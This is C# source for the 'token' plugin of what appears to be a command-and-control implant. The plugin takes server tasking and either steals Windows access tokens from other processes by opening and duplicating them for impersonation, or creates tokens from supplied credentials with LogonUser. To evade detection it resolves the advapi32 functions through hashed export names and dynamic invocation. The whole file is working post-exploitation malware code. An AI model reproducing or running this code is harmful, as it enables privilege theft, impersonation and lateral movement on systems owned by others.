using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Diagnostics;
using System.Security.Principal;
using Invoker.Dynamic;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "token";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private delegate bool logonUsrDelegate(string lpszUserName, string lpszDomain, string lpszPassword, Native.LogonType dwLogonType, Native.LogonProvider dwLogonProvider, out SafeAccessTokenHandle phToken);
        private delegate bool openProcTokenDelegate(IntPtr ProcessHandle, uint desiredAccess, out SafeAccessTokenHandle TokenHandle);
        private delegate bool dupeTokenDelegate(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, Native.TOKEN_TYPE TokenType, out SafeAccessTokenHandle phNewToken);
        private delegate bool closeHandleDelegate(IntPtr hObject);
        private long key = 0x617468656E61;
        private bool resolved = false;
        Dictionary<string, string> map = new Dictionary<string, string>()
        {
            { "ada","913D4B11CDB00C2A4496782D97EF10EE" },
            { "lgu","C8E11F2A94EC51A77D81D5B36F11983A" },
            { "opt","FC4C07508BF0023D72BF05F30D8A54A0" },
            { "dte","D16B373A40378BEA7C6E917480D4DF6E" },
            { "ch","A009186409957CF0C8AB5FD6D5451A25" },
        };
        private IntPtr luFunc = IntPtr.Zero;
        private IntPtr optFunc = IntPtr.Zero;
        private IntPtr dteFunc = IntPtr.Zero;
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }

        private bool Resolve()
        {
            var adaMod = Generic.GetLoadedModulePtr(map["ada"], key);

            if(adaMod == IntPtr.Zero)
            {
                resolved = false;
                return false;
            }
            this.luFunc = Generic.GetExportAddr(adaMod, map["lgu"], key);
            this.dteFunc = Generic.GetExportAddr(adaMod, map["dte"], key);
            this.optFunc = Generic.GetExportAddr(adaMod, map["opt"], key);

            if(luFunc == IntPtr.Zero || dteFunc == IntPtr.Zero || optFunc == IntPtr.Zero)
            {
                return false;
            }

            resolved = true;
            return true;
        }

        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);

            if (!resolved)
            {
                if (!this.Resolve())
                {
                    await messageManager.WriteLine("Failed to get exports", job.task.id, true, "error");
                    return;
                }
            }

            switch(args["action"].ToLower())
            {
                case "steal":
                    StealToken(job, args);
                    break;
                case "make":
                    MakeToken(job);
                    break;
                case "list":
                    await messageManager.AddResponse(tokenManager.List(job));
                    break;
                default:
                    await messageManager.AddResponse(new ResponseResult()
                    {
                        user_output = $"Failed: Invalid action specified.",
                        status = "errored",
                        completed = true,
                        task_id = job.task.id,
                    }.ToJson());
                    break;
            }
        }
        private void MakeToken(ServerJob job)
        {
            CreateToken tokenOptions = JsonSerializer.Deserialize(job.task.parameters, CreateTokenJsonContext.Default.CreateToken);
            SafeAccessTokenHandle hToken = new SafeAccessTokenHandle();
            try
            {
                Native.LogonType logonType;
                if (tokenOptions.netOnly)
                {
                    logonType = Native.LogonType.LOGON32_LOGON_NETWORK;
                }
                else
                {
                    logonType = Native.LogonType.LOGON32_LOGON_INTERACTIVE;
                }


                object[] logonParams = new object[] { tokenOptions.username, tokenOptions.domain, tokenOptions.password, logonType, Native.LogonProvider.LOGON32_PROVIDER_DEFAULT, hToken };
                bool result = Generic.InvokeFunc<bool>(luFunc, typeof(logonUsrDelegate), ref logonParams);

                if (!result)
                {
                    messageManager.AddResponse(new ResponseResult()
                    {
                        user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                        completed = true,
                        task_id = job.task.id,
                    }.ToJson());
                    return;
                }

                hToken = (SafeAccessTokenHandle)logonParams[5];
                messageManager.AddResponse(this.tokenManager.AddToken(hToken, tokenOptions, job.task.id).ToJson());
                return;
            }
            catch (Exception e)
            {
                messageManager.AddResponse(new ResponseResult()
                {
                    user_output = $"Failed: {e}",
                    status = "errored",
                    completed = true,
                    task_id = job.task.id,
                }.ToJson());
            }
        }

        private void StealToken(ServerJob job, Dictionary<string, string> args)
        {
            if (!args.ContainsKey("pid"))
            {
                messageManager.AddResponse(new ResponseResult()
                {
                    user_output = $"Failed: no pid specified.",
                    status = "errored",
                    completed = true,
                    task_id = job.task.id,
                }.ToJson());
                return;
            }

            if (int.TryParse(args["pid"], out var pid))
            {
                try
                {
                    Process proc = Process.GetProcessById(pid);
                    SafeAccessTokenHandle hToken = new SafeAccessTokenHandle();
                    SafeAccessTokenHandle dupHandle = new SafeAccessTokenHandle();
                    
                    SafeAccessTokenHandle procHandle = new SafeAccessTokenHandle(proc.Handle);

                    object[] optParams = new object[] { procHandle.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, hToken};

                    bool result = Generic.InvokeFunc<bool>(optFunc, typeof(openProcTokenDelegate), ref optParams);

                    if (!result)
                    {
                        messageManager.AddResponse(new ResponseResult()
                        {
                            user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                            status = "errored",
                            completed = true,
                            task_id = job.task.id,
                        }.ToJson());
                        return;
                    }

                    hToken = (SafeAccessTokenHandle)optParams[2];

                    object[] dtParams = new object[] { hToken.DangerousGetHandle(), (uint)TokenAccessLevels.MaximumAllowed, IntPtr.Zero, (uint)TokenImpersonationLevel.Impersonation, Native.TOKEN_TYPE.TokenImpersonation, dupHandle };

                    result = Generic.InvokeFunc<bool>(dteFunc, typeof(dupeTokenDelegate), ref dtParams);

                    if (!result)
                    {
                        messageManager.AddResponse(new ResponseResult()
                        {
                            user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                            status = "errored",
                            completed = true,
                            task_id = job.task.id,
                        }.ToJson());
                        return;
                    }
                    
                    dupHandle = (SafeAccessTokenHandle)dtParams[5];

                    if(dupHandle.IsInvalid)
                    {
                        messageManager.AddResponse(new ResponseResult()
                        {
                            user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                            status = "errored",
                            completed = true,
                            task_id = job.task.id,
                        }.ToJson());
                        return;
                    }


                    CreateToken tokenOptions = new CreateToken();
                    tokenOptions.name = $"Process {proc.Id} (Duplicated)";
                    tokenOptions.username = proc.Id.ToString();
                    tokenOptions.domain = "stolen";
                    var response = this.tokenManager.AddToken(dupHandle, tokenOptions, job.task.id);

                    response.tokens.First().process_id = proc.Id;

                    messageManager.AddResponse(response.ToJson());

                    hToken.Dispose();
                }
                catch (Exception e)
                {
                    messageManager.AddResponse(new ResponseResult()
                    {
                        user_output = $"Failed: {e}",
                        status = "errored",
                        completed = true,
                        task_id = job.task.id,
                    }.ToJson());
                }
            
            }
        }
    }
}